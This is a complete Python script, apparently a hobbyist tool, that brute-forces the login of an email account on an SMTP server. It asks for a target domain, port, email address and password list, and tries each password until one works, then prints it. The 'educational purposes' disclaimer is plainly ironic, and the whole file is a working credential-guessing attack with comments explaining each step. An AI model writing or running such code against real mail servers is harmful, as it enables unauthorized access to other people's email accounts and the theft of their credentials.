import smtplib  # Imports the smtp library for the SMTP login ,HELO/EHLO command selection and TLS features

"""
                            SMTP LOGIN BRUTE FORCER
                                  by Rasar

             This script will brute force the login on an SMTP server
                 for... Educational purposes. Obviously.   :)

             Also for this to work, the password list will have to be
                 in the same directory this script is ran  from. 

"""
print("#" * 40, "\n\n",  " " * 13, "SMTP BRUTER ", "\n", " " * 14, "by Rasar", "\n\n", "#" * 38, "\n\n")     # This line is a simple banner for the program


targetdom = input("Enter the SMTP server domain:  ")  # This is to declare the target domain variable, submitted bu the user
targetport = input("Enter the port (587 usually):  ")  # Similar to the line above but declaring a port number instead
smtpserver = smtplib.SMTP(targetdom,targetport)  # This allows us to declare the SMTP server features from the imported library  as a variable , and sets the paramters submittedby the user
smtpserver.ehlo()  # This line is setting the mechanism that lets the server know what type of commands it will need for both the sender and the recipient to be able to support the message type
smtpserver.starttls()  # This starts the transport layer security protocol on the smtp server

user = input("Enter email address:  ")  # Again this is used for declaring a variable inputted by the user. This time it is the email address being used in the attack
passlist = input("Enter password list name:  ")  # This time the user will be prompted to enter the file name of the password list being used in the attack
passlist = open(passlist, "r")  # This line opens the required file and allows the passwords to be read from it

for password in passlist:  # This is the for loop for running through all the passwords in the list
    try:  # This is what the program is going to try and accomplish each cycle of the loop
        smtpserver.login(user,password)  # It will attempt the login to the smtp server with the email address provided and a password from the password list starting with the first name, moving onto the next after each failed attempt
        print("Password : %s" % password)  # If the password is correct you will get this message
        break  # If the password is correct the break will end the loop

    except smtplib.SMTPAuthenticationError:  # If an attempted password is wrong
        print("Failed")  # The console will display this message and move onto the next password in the list

